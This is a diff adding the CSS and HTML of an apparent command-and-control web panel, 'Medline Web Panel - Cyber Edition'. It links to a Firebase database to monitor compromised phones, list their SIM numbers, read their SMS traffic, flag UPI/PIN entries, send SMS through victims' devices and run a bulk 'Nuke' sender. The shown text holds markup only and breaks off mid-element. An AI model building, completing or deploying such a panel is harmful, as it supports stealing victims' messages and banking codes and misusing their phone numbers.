+.am-right{flex:1;min-width:0;}
+.am-meta{display:flex;align-items:center;gap:8px;margin-bottom:7px;flex-wrap:wrap;}
+.am-sndr{font-size:13px;font-weight:700;font-family:'Share Tech Mono',monospace;}
+.am-tp{font-size:10px;font-weight:700;padding:2px 7px;border-radius:5px;}
+.am-dt{font-size:10px;color:var(--dim);margin-left:auto;font-family:'Share Tech Mono',monospace;}
+.am-txt{font-size:13px;color:#a0c4d4;line-height:1.6;word-break:break-word;}
+
+/* SEND SMS */
+.sw{max-width:580px;}
+.sc2{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border);border-radius:20px;padding:28px;position:relative;overflow:hidden;margin-bottom:16px;}
+.sc2::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--mint),var(--gold),var(--lilac),var(--mint));background-size:200%;animation:shimmer 2.5s linear infinite;}
+.sc2-t{font-size:20px;font-weight:800;margin-bottom:4px;}
+.sc2-s{font-size:12px;color:var(--sub);margin-bottom:22px;}
+.ddisp{background:var(--bg3);border:1px solid var(--border);border-radius:11px;padding:13px 16px;margin-bottom:18px;display:flex;align-items:center;gap:11px;}
+.dd-name{font-size:13px;font-weight:600;flex:1;}
+.dd-id{font-size:10px;color:var(--sub);font-family:'Share Tech Mono',monospace;}
+.sim-tog{display:flex;gap:9px;margin-bottom:18px;}
+.sim-col{flex:1;display:flex;flex-direction:column;gap:6px;}
+.stb{width:100%;padding:11px 13px;background:var(--bg3);border:1px solid var(--border);border-radius:11px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;text-align:left;}
+.stb.s1{background:rgba(0,212,255,.12);border-color:rgba(0,212,255,.3);color:var(--gold2);}
+.stb.s2{background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.28);color:var(--sky);}
+.snrow{display:flex;align-items:center;gap:6px;padding:0 2px;}
+.sntxt{font-size:12px;font-family:'Share Tech Mono',monospace;color:var(--sub);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cpb{padding:3px 10px;background:var(--bg4);border:1px solid var(--border);border-radius:6px;color:var(--dim);font-family:'Exo 2',sans-serif;font-size:10px;font-weight:700;cursor:pointer;transition:all .15s;}
+.cpb:hover{color:var(--text);border-color:var(--border2);}
+.cpb.ok{color:var(--mint);border-color:rgba(0,212,170,.3);background:rgba(0,212,170,.08);}
+.sinp,.sarea{width:100%;padding:13px 16px;background:rgba(16,28,46,.7);border:1px solid rgba(0,212,255,.12);border-radius:11px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:14px;font-weight:600;outline:none;transition:border-color .2s,box-shadow .2s;}
+.sinp{margin-bottom:12px;}
+.sarea{resize:vertical;min-height:100px;margin-bottom:18px;line-height:1.55;}
+.sinp:focus,.sarea:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(0,212,255,.1);}
+.sinp::placeholder,.sarea::placeholder{color:var(--dim);}
+.sbtn{width:100%;padding:15px;border:none;border-radius:12px;color:#020810;font-family:'Exo 2',sans-serif;font-size:15px;font-weight:800;cursor:pointer;
+  background:linear-gradient(135deg,#22e5ff,#00d4ff,#0088ff);
+  box-shadow:0 4px 28px rgba(0,212,255,.35),inset 0 1px 0 rgba(255,255,255,.2);transition:all .2s;letter-spacing:.2px;}
+.sbtn:hover{transform:translateY(-2px);box-shadow:0 10px 36px rgba(0,212,255,.45);}
+.sbtn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+.sres{margin-top:12px;padding:12px 16px;border-radius:11px;font-size:13px;font-weight:600;display:none;}
+.sres.ok{background:rgba(0,212,170,.1);color:var(--mint);border:1px solid rgba(0,212,170,.2);}
+.sres.err{background:rgba(255,107,107,.08);color:var(--rose);border:1px solid rgba(255,107,107,.18);}
+
+/* NUKE */
+.nuke-card{background:linear-gradient(145deg,rgba(20,8,8,.98),rgba(16,6,6,.98));border:1px solid rgba(255,107,107,.2);border-radius:20px;padding:28px;position:relative;overflow:hidden;margin-bottom:16px;max-width:580px;}
+.nuke-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--rose),#ff8c00,#ffd60a,var(--rose));background-size:200%;animation:shimmer 1.5s linear infinite;}
+.nuke-fire-btn{width:100%;padding:16px;border:none;border-radius:12px;color:#fff;font-family:'Exo 2',sans-serif;font-size:16px;font-weight:900;cursor:pointer;background:linear-gradient(135deg,#ff3333,#ff6b00);box-shadow:0 6px 30px rgba(255,50,50,.5);transition:all .2s;letter-spacing:.5px;}
+.nuke-fire-btn:hover{transform:translateY(-3px);box-shadow:0 14px 42px rgba(255,50,50,.65);}
+.nuke-stop-btn{width:100%;padding:16px;border:1px solid rgba(255,107,107,.3);border-radius:12px;color:var(--rose);font-family:'Exo 2',sans-serif;font-size:16px;font-weight:900;cursor:pointer;background:rgba(255,107,107,.1);transition:all .2s;}
+.nuke-inp{width:100%;padding:13px 16px;background:rgba(30,10,10,.8);border:1px solid rgba(255,107,107,.2);border-radius:11px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:14px;outline:none;margin-bottom:14px;transition:border-color .2s;}
+.nuke-inp:focus{border-color:var(--rose);box-shadow:0 0 0 3px rgba(255,107,107,.1);}
+.nuke-inp::placeholder{color:var(--dim);}
+.nuke-area{width:100%;padding:13px 16px;background:rgba(30,10,10,.8);border:1px solid rgba(255,107,107,.2);border-radius:11px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:14px;outline:none;resize:vertical;min-height:80px;margin-bottom:6px;transition:border-color .2s;}
+.nuke-area:focus{border-color:var(--rose);box-shadow:0 0 0 3px rgba(255,107,107,.1);}
+.nuke-area::placeholder{color:var(--dim);}
+.nuke-sim-btn{flex:1;padding:11px;border-radius:10px;font-family:'Exo 2',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;}
+.nuke-sim-s1{background:rgba(0,212,255,.12);border:1px solid rgba(0,212,255,.3);color:var(--gold2);}
+.nuke-sim-s2{background:var(--bg3);border:1px solid var(--border);color:var(--sub);}
+.nuke-stat-box{background:rgba(255,50,50,.06);border:1px solid rgba(255,107,107,.18);border-radius:12px;padding:16px;margin-bottom:16px;display:none;}
+.nuke-log{max-height:150px;overflow-y:auto;display:flex;flex-direction:column-reverse;gap:3px;margin-top:10px;}
+.nuke-log-entry{font-size:10px;font-family:'Share Tech Mono',monospace;padding:3px 8px;border-radius:5px;}
+
+/* MODALS */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.82);backdrop-filter:blur(16px);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
+.overlay.open{display:flex;}
+.modal{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border2);border-radius:22px;padding:30px;width:100%;max-width:420px;box-shadow:0 40px 100px rgba(0,0,0,.7),0 0 40px rgba(0,212,255,.04);animation:modalIn .28s cubic-bezier(.34,1.56,.64,1);position:relative;overflow:hidden;}
+.modal::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--gold),var(--amber),var(--gold));background-size:200%;animation:shimmer 2s linear infinite;}
+.mt{font-size:18px;font-weight:800;margin-bottom:20px;}
+.mbtns{display:flex;gap:9px;margin-top:6px;}
+.mcnc{flex:1;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;color:var(--sub);font-family:'Exo 2',sans-serif;font-weight:600;cursor:pointer;font-size:13px;transition:all .15s;}
+.mcnc:hover{color:var(--text);border-color:var(--border2);}
+.mok{flex:2;padding:12px;background:linear-gradient(135deg,var(--gold),var(--amber));border:none;border-radius:10px;color:#020810;font-family:'Exo 2',sans-serif;font-weight:800;cursor:pointer;font-size:13px;transition:all .15s;}
+.mok:hover{box-shadow:0 6px 20px rgba(0,212,255,.4);}
+.mok.danger{background:var(--rose);color:#fff;}.mok.danger:hover{box-shadow:0 6px 20px rgba(255,107,107,.4);}
+.ldwrap{display:flex;align-items:center;justify-content:center;padding:60px;color:var(--sub);font-size:13px;gap:12px;}
+.gold-spin{width:20px;height:20px;border-radius:50%;border:2px solid transparent;border-top-color:var(--gold);border-right-color:var(--amber);animation:spin .8s linear infinite;}
+.empty{text-align:center;padding:70px 20px;color:var(--dim);}
+.empty .ei{font-size:48px;margin-bottom:14px;}
+.empty p{font-size:13px;}
+.ph{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;color:var(--dim);gap:16px;}
+.ph .pi{font-size:60px;animation:float 4s ease-in-out infinite;}
+.ph p{font-size:13px;}
+.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(20px);
+  background:linear-gradient(135deg,var(--bg4),var(--bg3));border:1px solid var(--border2);
+  color:var(--text);font-size:13px;font-weight:700;padding:12px 26px;border-radius:24px;z-index:999;
+  opacity:0;transition:all .35s cubic-bezier(.34,1.56,.64,1);pointer-events:none;white-space:nowrap;
+  box-shadow:0 10px 36px rgba(0,0,0,.5),0 0 20px rgba(0,212,255,.1);}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+#rawView{display:none;background:var(--bg3);border:1px solid rgba(0,212,255,.2);border-radius:11px;padding:14px;margin-bottom:12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--gold);line-height:1.6;max-height:280px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head>
+<body>
+
+<div id="setup">
+  <div class="orb o1"></div><div class="orb o2"></div>
+  <div class="setup-card">
+    <div class="cat-stage">
+      <div class="cat-sh"></div>
+      <div class="cp" style="left:29%;bottom:54%;background:#00d4ff;--dur:1.9s;--del:0s;--dx:-20px;width:5px;height:5px;"></div>
+      <div class="cp" style="left:71%;bottom:60%;background:#00d4aa;--dur:2.2s;--del:.35s;--dx:18px;width:4px;height:4px;"></div>
+      <div class="cp" style="left:50%;bottom:72%;background:#22e5ff;--dur:1.7s;--del:.7s;--dx:12px;width:3px;height:3px;"></div>
+      <div class="cp" style="left:38%;bottom:64%;background:#c084fc;--dur:2.4s;--del:1s;--dx:-14px;width:4px;height:4px;"></div>
+      <div class="cp" style="left:66%;bottom:69%;background:#38bdf8;--dur:2s;--del:1.3s;--dx:10px;width:3px;height:3px;"></div>
+      <div class="cat-wrap" onclick="catClick()"><svg class="cat-svg" viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <radialGradient id="cBod" cx="40%" cy="30%"><stop offset="0%" stop-color="#0a1422"/><stop offset="55%" stop-color="#060e18"/><stop offset="100%" stop-color="#030810"/></radialGradient>
+    <radialGradient id="cBod2" cx="55%" cy="40%"><stop offset="0%" stop-color="#0a1220"/><stop offset="100%" stop-color="#030810"/></radialGradient>
+    <radialGradient id="eyeGL" cx="35%" cy="35%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="45%" stop-color="#005aaa"/><stop offset="100%" stop-color="#001a2a"/></radialGradient>
+    <radialGradient id="eyeGR" cx="35%" cy="35%"><stop offset="0%" stop-color="#00d4aa"/><stop offset="50%" stop-color="#007a60"/><stop offset="100%" stop-color="#001a14"/></radialGradient>
+    <radialGradient id="hGrad" cx="40%" cy="30%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="100%" stop-color="#005080"/></radialGradient>
+    <filter id="glow" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <filter id="sg" x="-40%" y="-40%" width="180%" height="180%"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="collar" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="33%" stop-color="#00d4aa"/><stop offset="66%" stop-color="#c084fc"/><stop offset="100%" stop-color="#00d4ff"/></linearGradient>
+  </defs>
+  <ellipse cx="72" cy="108" rx="30" ry="20" fill="rgba(0,0,0,.3)" transform="translate(4,6)"/>
+  <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(0,212,255,0.7)" stroke-width="6" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
+  <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(0,212,170,0.2)" stroke-width="3" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
+  <ellipse cx="70" cy="103" rx="30" ry="23" fill="url(#cBod2)"/>
+  <path d="M 38,36 L 25,6 L 52,30" fill="url(#hGrad)" filter="url(#glow)"/>
+  <path d="M 38,36 L 30,13 L 48,30" fill="#22e5ff" opacity=".3"/>
+  <path d="M 102,36 L 115,6 L 88,30" fill="url(#hGrad)" filter="url(#glow)"/>
+  <path d="M 102,36 L 110,13 L 92,30" fill="#22e5ff" opacity=".3"/>
+  <circle cx="70" cy="60" r="32" fill="url(#cBod)"/>
+  <ellipse cx="58" cy="44" rx="16" ry="10" fill="rgba(0,212,255,.07)" transform="rotate(-25,58,44)"/>
+  <polygon points="38,38 30,16 52,33" fill="url(#cBod)"/>
+  <polygon points="102,38 110,16 88,33" fill="url(#cBod)"/>
+  <polygon points="40,36 34,20 50,32" fill="rgba(0,212,255,.5)"/>
+  <polygon points="100,36 106,20 90,32" fill="rgba(0,212,255,.5)"/>
+  <g style="animation:eyeBlink 5s infinite;transform-origin:56px 60px">
+    <ellipse cx="56" cy="60" rx="10" ry="11" fill="url(#eyeGL)" filter="url(#glow)"/>
+    <ellipse cx="56" cy="60" rx="10" ry="11" fill="none" stroke="rgba(0,212,255,.6)" stroke-width="1.5"/>
+    <ellipse cx="56" cy="60" rx="3.5" ry="9" fill="#001a2a"/>
+    <circle cx="59" cy="55" r="2.8" fill="rgba(0,220,255,.9)"/>
+    <circle cx="52" cy="64" r="1.2" fill="rgba(255,255,255,.2)"/>
+  </g>
+  <g style="animation:eyeBlink 5s infinite;animation-delay:.07s;transform-origin:84px 60px">
+    <ellipse cx="84" cy="60" rx="10" ry="11" fill="url(#eyeGR)" filter="url(#glow)"/>
+    <ellipse cx="84" cy="60" rx="10" ry="11" fill="none" stroke="rgba(0,212,170,.55)" stroke-width="1.5"/>
+    <ellipse cx="84" cy="60" rx="3.5" ry="9" fill="#001a12"/>
+    <circle cx="87" cy="55" r="2.8" fill="rgba(0,212,170,.85)"/>
+    <circle cx="80" cy="64" r="1.2" fill="rgba(255,255,255,.18)"/>
+  </g>
+  <polygon points="70,70 66,75 74,75" fill="rgba(0,212,170,.9)"/>
+  <path d="M 66,75 Q 61,81 57,79" stroke="rgba(255,255,255,.45)" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+  <path d="M 74,75 Q 79,81 83,79" stroke="rgba(255,255,255,.45)" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+  <path d="M 62,79 L 59,86" stroke="rgba(255,255,255,.65)" stroke-width="1.8" stroke-linecap="round"/>
+  <path d="M 78,79 L 81,86" stroke="rgba(255,255,255,.65)" stroke-width="1.8" stroke-linecap="round"/>
+  <line x1="22" y1="63" x2="50" y2="65" stroke="rgba(0,212,255,.32)" stroke-width="1.3"/>
+  <line x1="20" y1="70" x2="50" y2="70" stroke="rgba(0,212,255,.24)" stroke-width="1.3"/>
+  <line x1="22" y1="77" x2="50" y2="75" stroke="rgba(0,212,255,.16)" stroke-width="1.3"/>
+  <line x1="118" y1="63" x2="90" y2="65" stroke="rgba(0,212,255,.32)" stroke-width="1.3"/>
+  <line x1="120" y1="70" x2="90" y2="70" stroke="rgba(0,212,255,.24)" stroke-width="1.3"/>
+  <line x1="118" y1="77" x2="90" y2="75" stroke="rgba(0,212,255,.16)" stroke-width="1.3"/>
+  <path d="M 42,84 Q 70,96 98,84" stroke="url(#collar)" stroke-width="5.5" fill="none" stroke-linecap="round" filter="url(#sg)"/>
+  <circle cx="70" cy="92" r="6" fill="#00d4ff" stroke="rgba(0,212,170,.7)" stroke-width="1.8"/>
+  <ellipse cx="67.5" cy="89.5" rx="2" ry="1.5" fill="rgba(120,240,255,.45)"/>
+  <ellipse cx="55" cy="120" rx="9" ry="6" fill="url(#cBod2)"/>
+  <ellipse cx="85" cy="120" rx="9" ry="6" fill="url(#cBod2)"/>
+</svg></div>
+    </div>
+    <div class="setup-eyebrow">Medline Web Panel</div>
+    <div class="setup-h"><span class="gold-word">Cyber</span> Edition</div>
+    <div class="setup-sub">Connect your Firebase database to start monitoring devices in real-time</div>
+    <label class="fl">Firebase Database URL</label>
+    <input id="fbUrl" class="fi" placeholder="https://project.firebaseio.com" type="url"/>
+    <label class="fl">Auth Key / Token</label>
+    <input id="fbKey" class="fi" placeholder="your-auth-key" type="password"/>
+    <button class="cta" onclick="rippleClick(event);connect()">&#9889; Connect to Firebase &rarr;</button>
+    <div class="s-err" id="serr">Connection failed &mdash; check URL and key</div>
+    <div class="s-footer"><span class="gold-grad">Medline Panel &mdash; Cyber Edition</span></div>
+  </div>
+</div>
+
+<div id="panel">
+  <div class="tb">
+    <div class="tb-dots"><div class="td td-r" onclick="disconnect()" title="Disconnect"></div><div class="td td-y"></div><div class="td td-g"></div></div>
+    <div class="tb-logo"><span class="tb-gl">Medline</span> Panel</div>
+    <div class="tb-pills"><span class="pill p-t" id="tpTot">&mdash;</span><span class="pill p-on" id="tpOn">&mdash;</span><span class="pill p-off" id="tpOff">&mdash;</span></div>
+    <div class="live-dot"></div>
+    <button class="tb-btn" onclick="loadDevs()" title="Refresh">&#8635;</button>
+  </div>
+  <div class="body">
+    <div class="sb">
+      <div class="sb-search"><div class="sb-sbox"><span style="color:var(--dim)">&#9900;</span><input id="sbSearch" placeholder="Search devices..." oninput="renderSB()"/></div></div>
+      <div class="sb-filters">
+        <button class="sbf fa" id="sfAll" onclick="setSF('all')">All</button>
+        <button class="sbf" id="sfOn" onclick="setSF('online')">&#128994;</button>
+        <button class="sbf" id="sfOff" onclick="setSF('offline')">&#128308;</button>
+        <button class="sbf" id="sfPin" onclick="setSF('pin')">&#128179;</button>
+      </div>
+      <div class="sb-list" id="sbList"><div class="ldwrap"><div class="gold-spin"></div> Loading...</div></div>
+      <div class="sb-footer">
+        <button class="sfbtn" onclick="openM('addModal')">&#65291;</button>
+        <button class="sfbtn" onclick="openM('updModal')">&#9998;</button>
+        <button class="sfbtn del" onclick="delOff()">&#128465;</button>
+      </div>
+      <div class="sb-brand"><span class="gold-grad">Medline Cyber</span></div>
+    </div>
+    <div class="main">
+      <div class="tabs">
+        <div class="tab active" onclick="switchTab('overview')">&#128202; Overview</div>
+        <div class="tab" onclick="switchTab('detail')">&#128241; Device</div>
+        <div class="tab" onclick="switchTab('messages')">&#128172; Messages</div>
+        <div class="tab" onclick="switchTab('sendsms')">&#128225; Send SMS</div>
+        <div class="tab" onclick="switchTab('allmsgs')">&#128203; All Messages</div>
+        <div class="tab" onclick="switchTab('nuke')">&#128163; Nuke</div>
+      </div>
+      <div class="tab-body">
+
+        <div class="pane active" id="pane-overview">
+          <div class="ov-banner">
+            <svg class="ov-mini-cat" viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <radialGradient id="cBod3" cx="40%" cy="30%"><stop offset="0%" stop-color="#0a1422"/><stop offset="55%" stop-color="#060e18"/><stop offset="100%" stop-color="#030810"/></radialGradient>
+    <radialGradient id="cBod4" cx="55%" cy="40%"><stop offset="0%" stop-color="#0a1220"/><stop offset="100%" stop-color="#030810"/></radialGradient>
+    <radialGradient id="eyeGL2" cx="35%" cy="35%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="45%" stop-color="#005aaa"/><stop offset="100%" stop-color="#001a2a"/></radialGradient>
+    <radialGradient id="eyeGR2" cx="35%" cy="35%"><stop offset="0%" stop-color="#00d4aa"/><stop offset="50%" stop-color="#007a60"/><stop offset="100%" stop-color="#001a14"/></radialGradient>
+    <radialGradient id="hGrad2" cx="40%" cy="30%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="100%" stop-color="#005080"/></radialGradient>
+    <filter id="glow2" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <filter id="sg2" x="-40%" y="-40%" width="180%" height="180%"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="collar2" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#00d4ff"/><stop offset="33%" stop-color="#00d4aa"/><stop offset="66%" stop-color="#c084fc"/><stop offset="100%" stop-color="#00d4ff"/></linearGradient>
+  </defs>
+  <ellipse cx="72" cy="108" rx="30" ry="20" fill="rgba(0,0,0,.3)" transform="translate(4,6)"/>
+  <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(0,212,255,0.7)" stroke-width="6" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
+  <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(0,212,170,0.2)" stroke-width="3" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
+  <ellipse cx="70" cy="103" rx="30" ry="23" fill="url(#cBod4)"/>
+  <path d="M 38,36 L 25,6 L 52,30" fill="url(#hGrad2)" filter="url(#glow2)"/>
+  <path d="M 38,36 L 30,13 L 48,30" fill="#22e5ff" opacity=".3"/>
+  <path d="M 102,36 L 115,6 L 88,30" fill="url(#hGrad2)" filter="url(#glow2)"/>
+  <path d="M 102,36 L 110,13 L 92,30" fill="#22e5ff" opacity=".3"/>
+  <circle cx="70" cy="60" r="32" fill="url(#cBod3)"/>
+  <ellipse cx="58" cy="44" rx="16" ry="10" fill="rgba(0,212,255,.07)" transform="rotate(-25,58,44)"/>
+  <polygon points="38,38 30,16 52,33" fill="url(#cBod3)"/>
+  <polygon points="102,38 110,16 88,33" fill="url(#cBod3)"/>
+  <polygon points="40,36 34,20 50,32" fill="rgba(0,212,255,.5)"/>
+  <polygon points="100,36 106,20 90,32" fill="rgba(0,212,255,.5)"/>
+  <g style="animation:eyeBlink 5s infinite;transform-origin:56px 60px">
+    <ellipse cx="56" cy="60" rx="10" ry="11" fill="url(#eyeGL2)" filter="url(#glow2)"/>
+    <ellipse cx="56" cy="60" rx="10" ry="11" fill="none" stroke="rgba(0,212,255,.6)" stroke-width="1.5"/>
+    <ellipse cx="56" cy="60" rx="3.5" ry="9" fill="#001a2a"/>
+    <circle cx="59" cy="55" r="2.8" fill="rgba(0,220,255,.9)"/>
+    <circle cx="52" cy="64" r="1.2" fill="rgba(255,255,255,.2)"/>
+  </g>
+  <g style="animation:eyeBlink 5s infinite;animation-delay:.07s;transform-origin:84px 60px">
+    <ellipse cx="84" cy="60" rx="10" ry="11" fill="url(#eyeGR2)" filter="url(#glow2)"/>
+    <ellipse cx="84" cy="60" rx="10" ry="11" fill="none" stroke="rgba(0,212,170,.55)" stroke-width="1.5"/>
+    <ellipse cx="84" cy="60" rx="3.5" ry="9" fill="#001a12"/>
+    <circle cx="87" cy="55" r="2.8" fill="rgba(0,212,170,.85)"/>
+    <circle cx="80" cy="64" r="1.2" fill="rgba(255,255,255,.18)"/>
+  </g>
+  <polygon points="70,70 66,75 74,75" fill="rgba(0,212,170,.9)"/>
+  <path d="M 66,75 Q 61,81 57,79" stroke="rgba(255,255,255,.45)" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+  <path d="M 74,75 Q 79,81 83,79" stroke="rgba(255,255,255,.45)" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+  <path d="M 62,79 L 59,86" stroke="rgba(255,255,255,.65)" stroke-width="1.8" stroke-linecap="round"/>
+  <path d="M 78,79 L 81,86" stroke="rgba(255,255,255,.65)" stroke-width="1.8" stroke-linecap="round"/>
+  <line x1="22" y1="63" x2="50" y2="65" stroke="rgba(0,212,255,.32)" stroke-width="1.3"/>
+  <line x1="20" y1="70" x2="50" y2="70" stroke="rgba(0,212,255,.24)" stroke-width="1.3"/>
+  <line x1="22" y1="77" x2="50" y2="75" stroke="rgba(0,212,255,.16)" stroke-width="1.3"/>
+  <line x1="118" y1="63" x2="90" y2="65" stroke="rgba(0,212,255,.32)" stroke-width="1.3"/>
+  <line x1="120" y1="70" x2="90" y2="70" stroke="rgba(0,212,255,.24)" stroke-width="1.3"/>
+  <line x1="118" y1="77" x2="90" y2="75" stroke="rgba(0,212,255,.16)" stroke-width="1.3"/>
+  <path d="M 42,84 Q 70,96 98,84" stroke="url(#collar2)" stroke-width="5.5" fill="none" stroke-linecap="round" filter="url(#sg2)"/>
+  <circle cx="70" cy="92" r="6" fill="#00d4ff" stroke="rgba(0,212,170,.7)" stroke-width="1.8"/>
+  <ellipse cx="67.5" cy="89.5" rx="2" ry="1.5" fill="rgba(120,240,255,.45)"/>
+  <ellipse cx="55" cy="120" rx="9" ry="6" fill="url(#cBod4)"/>
+  <ellipse cx="85" cy="120" rx="9" ry="6" fill="url(#cBod4)"/>
+</svg>
+            <div>
+              <div class="ov-title">&#10024; <span class="gold-word">Live Dashboard</span></div>
+              <div class="ov-stats">
+                <div class="ov-s tot">Total: <span id="ov-tot">&mdash;</span></div>
+                <div class="ov-s on">Online: <span id="ov-on">&mdash;</span></div>
+                <div class="ov-s off">Offline: <span id="ov-off">&mdash;</span></div>
+                <div class="ov-s pin">UPI: <span id="ov-upi">&mdash;</span></div>
+              </div>
+            </div>
+          </div>
+          <div class="stat-grid">
+            <div class="sc sc-g"><div class="sv" id="sv-tot" style="color:var(--gold2)">&mdash;</div><div class="sl">Total Devices</div></div>
+            <div class="sc sc-a"><div class="sv" id="sv-on" style="color:var(--mint)">&mdash;</div><div class="sl">Online</div></div>
+            <div class="sc sc-r"><div class="sv" id="sv-off" style="color:var(--rose)">&mdash;</div><div class="sl">Offline</div></div>
+            <div class="sc sc-p"><div class="sv" id="sv-sim" style="color:var(--lilac)">&mdash;</div><div class="sl">SIMs</div></div>
+          </div>
+          <div class="sec-hdr">Devices &mdash; Newest First</div>
+          <div class="tbl-wrap" id="ovTable"><div class="ldwrap"><div class="gold-spin"></div> Loading...</div></div>
+        </div>
+
+        <div class="pane" id="pane-detail">
+          <div class="ph" id="detPH"><div class="pi">&#128241;</div><p>Select a device from the sidebar</p></div>
+          <div id="detCont" style="display:none"></div>
+        </div>
+
+        <div class="pane" id="pane-messages">
+          <div id="msgNoDev" class="no-dev"><div class="ei">&#128172;</div><p>Select a device to view messages</p></div>
+          <div id="msgCont" style="display:none">
+            <div class="msg-top">
+              <div style="display:flex;align-items:center;gap:10px"><div class="msg-dn" id="msgDevN">Messages</div><div class="msg-cnt" id="msgCnt">0</div></div>
+              <div style="display:flex;align-items:center;gap:8px">
+                <button class="mbtn" id="mrefBtn" onclick="refreshMsgs()">&#8635; Refresh</button>
+                <button class="mbtn" onclick="showRaw()" style="color:var(--gold);border-color:rgba(0,212,255,.3)">&#128269; Raw</button>
+                <div class="live-b"><div class="ld"></div> Live</div>
+              </div>
+            </div>
+            <div class="simbar">
+              <div class="ms-sim"><div class="ms-dot s1"></div><div class="ms-info"><div class="ms-lbl">SIM 1</div><div class="ms-num" id="ms1n">&mdash;</div><div class="ms-car" id="ms1c">&mdash;</div></div><button class="ms-cp" id="mcp1" onclick="cpSim(1)">Copy</button></div>
+              <div class="ms-div"></div>
+              <div class="ms-sim"><div class="ms-dot s2"></div><div class="ms-info"><div class="ms-lbl">SIM 2</div><div class="ms-num" id="ms2n">&mdash;</div><div class="ms-car" id="ms2c">&mdash;</div></div><button class="ms-cp" id="mcp2" onclick="cpSim(2)">Copy</button></div>
+            </div>
+            <div id="rawView"></div>
+            <div class="msg-bar">
+              <div class="sbox"><span style="color:var(--dim)">&#9900;</span><input id="msgSrch" placeholder="Search messages..." oninput="filterMsgs()"/></div>
+              <button class="mfb ma" id="mf-all" onclick="setMF('all')">All</button>
+              <button class="mfb" id="mf-incoming" onclick="setMF('incoming')">In</button>
+              <button class="mfb" id="mf-outgoing" onclick="setMF('outgoing')">Out</button>
+            </div>
+            <div id="msgList" class="msg-list"></div>
+          </div>
+        </div>
+
+        <div class="pane" id="pane-sendsms">
+          <div class="sw"><div class="sc2">
+            <div class="sc2-t">&#128225; Send SMS</div>
+            <div class="sc2-s">Route a message through any connected device</div>
+            <div class="ddisp" id="devDisp"><div style="width:9px;height:9px;border-radius:50%;flex-shrink:0;background:var(--dim);">&nbsp;</div><div><div class="dd-name">No device selected</div><div class="dd-id">Pick from sidebar</div></div></div>
+            <div class="sim-tog">
+              <div class="sim-col"><button class="stb s1" id="sb1" onclick="selSim(1)">SIM 1</button><div class="snrow"><span class="sntxt" id="sn1">&mdash;</span><button class="cpb" id="cp1" onclick="cpSN(1)">Copy</button></div></div>
+              <div class="sim-col"><button class="stb" id="sb2" onclick="selSim(2)">SIM 2</button><div class="snrow"><span class="sntxt" id="sn2">&mdash;</span><button class="cpb" id="cp2" onclick="cpSN(2)">Copy</button></div></div>
+            </div>
+            <label class="fl">To (Phone Number)</label><input id="sTo" class="sinp" placeholder="+91 9876543210"/>
+            <label class="fl" style="margin-top:3px">Message</label><textarea id="sMsg" class="sarea" placeholder="Type your message..."></textarea>
+            <button class="sbtn" id="sBtn" onclick="sendSms()">&#128640; Send Message</button>
+            <div class="sres" id="sRes"></div>
+          </div></div>
+        </div>
+
+        <div class="pane" id="pane-allmsgs">
+          <div class="msg-top">
